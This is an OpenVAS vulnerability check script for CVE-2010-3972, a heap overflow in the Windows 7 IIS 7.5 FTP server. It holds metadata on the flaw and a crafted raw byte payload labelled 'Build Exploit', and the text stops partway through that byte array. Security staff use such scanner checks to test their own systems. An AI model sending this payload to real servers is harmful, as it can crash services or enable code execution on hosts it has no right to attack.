###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ms_iis_ftpd_dos_vuln.nasl 5323 2017-02-17 08:49:23Z teissa $
#
# Microsoft Windows IIS FTP Server DOS Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Updated By : Sooraj KS <kssooraj@secpod.com> on 2011-04-12
# Updated to detect vulnerable patterns.
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation may allow remote attackers to execute arbitrary code
  on the system or cause the application to crash.
  Impact Level: Application";
tag_affected = "Windows 7 IIS 7.5 FTP Server";
tag_insight = "The flaw is due to a boundary error when encoding Telnet IAC
  characters in a FTP response. This can be exploited without authenticating
  to the FTP service to cause a heap-based buffer overflow by sending an overly
  long, specially crafted FTP request.";
tag_solution = "Run Windows Update and update the listed hotfixes or download and
  update mentioned hotfixes in the advisory from the below link,
  http://www.microsoft.com/technet/security/bulletin/ms11-004.mspx";
tag_summary = "This host is running Microsoft IIS with FTP server and is prone to
  Denial of service vulnerability.";

if(description)
{
  script_id(801669);
  script_version("$Revision: 5323 $");
  script_tag(name:"last_modification", value:"$Date: 2017-02-17 09:49:23 +0100 (Fri, 17 Feb 2017) $");
  script_tag(name:"creation_date", value:"2010-12-27 09:55:05 +0100 (Mon, 27 Dec 2010)");
  script_cve_id("CVE-2010-3972");
  script_bugtraq_id(45542);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("Microsoft Windows IIS FTP Server DOS Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/42713");
  script_xref(name : "URL" , value : "http://www.kb.cert.org/vuls/id/842372");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/15803/");
  script_xref(name : "URL" , value : "http://www.securitytracker.com/id?1024921");
  script_xref(name : "URL" , value : "http://www.vupen.com/english/advisories/2010/3305");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/ftp", 21);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}


include("ftp_func.inc");

## Get FTP Port
ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

## Get Port Status
if(!get_port_state(ftpPort)){
  exit(0);
}

## Confirm Application
banner = get_ftp_banner(port:ftpPort);
if("Microsoft FTP Service" >!< banner){
  exit(0);
}

## Build Exploit
attack = raw_string(
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0,
0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83,
0xb0, 0xef, 0x83, 0xb0, 0xef, 0x83, 0xb0, 0xef,
0x83, 0xb0, 0x31, 0x34, 0x34, 0x39, 0x38, 0xef,
0xbb, 0xbf, 0xff, 0xef, 0xfe, 0xff, 0xff, 0xef,
0xff, 0xef, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xfe,
0xff, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xfe, 0xff,
0xef, 0xbb, 0xbf, 0xff, 0xef, 0xef, 0xbb, 0xbf,
0xef, 0xbb, 0xbf, 0xff, 0xef, 0xff, 0xef, 0xff,
0xef, 0xff, 0xef, 0xfe, 0xff, 0xef, 0xbb, 0xbf,
0xff, 0xef, 0xef, 0xbb, 0xbf, 0xff, 0xef, 0xef,
0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf,
0xff, 0xef, 0xfe, 0xff, 0xff, 0xef, 0xef, 0xbb,
0xbf, 0xef, 0xbb, 0xbf, 0xfe, 0xff, 0xff, 0xef,
0xff, 0xef, 0xfe, 0xff, 0xff, 0xef, 0xfe, 0xff,
0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xff, 0xef, 0xfe,
0xff, 0xff, 0xef, 0xff, 0xef, 0xef, 0xbb, 0xbf,
0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf,
0xff, 0xef, 0xff, 0xef, 0xfe, 0xff, 0xff, 0xef,
0xff, 0xef, 0xff, 0xef, 0xff, 0xef, 0xef, 0xbb,
0xbf, 0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xef, 0xbb,
0xbf, 0xff, 0xef, 0xff, 0xef, 0xff, 0xef, 0xff,
0xef, 0xff, 0xef, 0xfe, 0xff, 0xfe, 0xff, 0xfe,
0xff, 0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xff, 0xef,
0xef, 0xbb, 0xbf, 0xff, 0xef, 0xff, 0xef, 0xef,
0xbb, 0xbf, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xef,
0xbb, 0xbf, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xfe,
0xff, 0xfe, 0xff, 0xff, 0xef, 0xff, 0xef, 0xfe,
0xff, 0xfe, 0xff, 0xef, 0xbb, 0xbf, 0xef, 0xbb,
0xbf, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xef,
0xbb, 0xbf, 0xff, 0xef, 0xff, 0xef, 0xef, 0xbb,
0xbf, 0xef, 0xbb, 0xbf, 0xef, 0xbb, 0xbf, 0xef,
0xbb, 0xbf, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xef,
0xbb, 0xbf, 0xff, 0xef, 0xef, 0xbb, 0xbf, 0xef,
